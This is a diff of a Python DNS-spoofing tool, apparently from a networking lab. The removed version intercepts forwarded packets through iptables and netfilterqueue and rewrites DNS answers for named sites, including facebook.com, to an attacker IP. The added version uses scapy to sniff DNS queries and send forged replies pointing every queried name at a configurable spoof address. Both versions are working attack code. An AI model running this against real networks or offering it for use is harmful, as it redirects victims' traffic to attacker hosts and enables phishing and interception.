@@ -1,77 +1,39 @@
+#! /usr/bin/env python3
+
 from scapy.all import *
-from netfilterqueue import NetfilterQueue
-import os
+import argparse
 
-dns_hosts = {
-    b"abc.ca": "34.212.60.182",
-    b"www.bcit.ca": "34.212.60.182",
-    b"facebook.com.": "34.212.60.182"
-}
+def dns_responder(local_ip: str, victim_ip: str, spoof_ip: str):
 
-def process_packet(packet):
-    """
-    Whenever a new packet is redirected to the netfilter queue,
-    this callback is called.
-    """
-    # convert netfilter queue packet to scapy packet
-    scapy_packet = IP(packet.get_payload())
-    if scapy_packet.haslayer(DNSRR):
-        # if the packet is a DNS Resource Record (DNS reply)
-        # modify the packet
-        print("[Before]:", scapy_packet.summary())
-        try:
-            scapy_packet = modify_packet(scapy_packet)
-        except IndexError:
-            # not UDP packet, this can be IPerror/UDPerror packets
-            pass
-        print("[After ]:", scapy_packet.summary())
-        # set back as netfilter queue packet
-        packet.set_payload(bytes(scapy_packet))
-    # accept the packet
-    packet.accept()
+    def get_response(pkt: IP):
+        if (
+            DNS in pkt and
+            pkt[DNS].opcode == 0 and
+            pkt[DNS].ancount == 0
+        ):
+            if str(pkt["DNS Question Record"].qname):
+                spf_resp = (IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport,sport=53)/DNS(id=pkt[DNS].id,ancount=1,qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname,rdata=spoof_ip)))
+                send(spf_resp)
+                print(spf_resp.show())
+                return f"Spoofed DNS Response Sent: {pkt[IP].src}"
 
-def modify_packet(packet):
-    """
-    Modifies the DNS Resource Record `packet` ( the answer part)
-    to map our globally defined `dns_hosts` dictionary.
-    For instance, whenever we see a google.com answer, this function replaces 
-    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
-    """
-    # get the DNS question name, the domain name
-    qname = packet[DNSQR].qname
-    #if qname not in dns_hosts:
-        # if the website isn't in our record
-        # we don't wanna modify that
-     #   print("no modification:", qname)
-      #  return packet
-    # craft new answer, overriding the original
-    # setting the rdata for the IP we want to redirect (spoofed)
-    # for instance, google.com will be mapped to "192.168.1.100"
-    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
-    # set the answer count to 1
-    packet[DNS].ancount = 1
-    # delete checksums and length of packet, because we have modified the packet
-    # new calculations are required ( scapy will do automatically )
-    del packet[IP].len
-    del packet[IP].chksum
-    del packet[UDP].len
-    del packet[UDP].chksum
-    # return the modified packet
-    return packet
+    return get_response
 
 
-QUEUE_NUM = 0
-# insert the iptables FORWARD rule
-os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
-# instantiate the netfilter queue
-queue = NetfilterQueue()
+if __name__ == "__main__":
+    BPF_FILTER = f"udp port 53 or tcp port 53"
 
-try:
-    # bind the queue number to our callback `process_packet`
-    # and start it
-    queue.bind(QUEUE_NUM, process_packet)
-    queue.run()
-except KeyboardInterrupt:
-    # if want to exit, make sure we
-    # remove that rule we just inserted, going back to normal.
-    os.system("iptables --flush")
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-r", "--responder", dest="dns_responder_ip", help="DNS Responder IP")
+    parser.add_argument("-t", "--target", dest="target_ip", help="DNS Spoof Victim IP")
+    parser.add_argument("-i", "--interface", dest="network_interface", help="Network Interface")
+    parser.add_argument("-s", "--spoof-ip", dest="spoof_ip", help="Spoof IP address")
+    args=parser.parse_args()
+
+    dns_responder_ip = args.dns_responder_ip if args.dns_responder_ip else "192.168.0.108"
+    dns_spoof_victim_ip = args.target_ip if args.target_ip else "192.168.0.108"
+    network_interface = args.network_interface if args.network_interface else "enp0s3"
+    dns_responder_ip = args.dns_responder_ip if args.dns_responder_ip else "192.168.0.108"
+    spoof_ip = args.spoof_ip if args.spoof_ip else "142.232.230.10"
+
+    sniff(filter=BPF_FILTER, prn=dns_responder(dns_responder_ip, dns_spoof_victim_ip, spoof_ip), iface=network_interface)
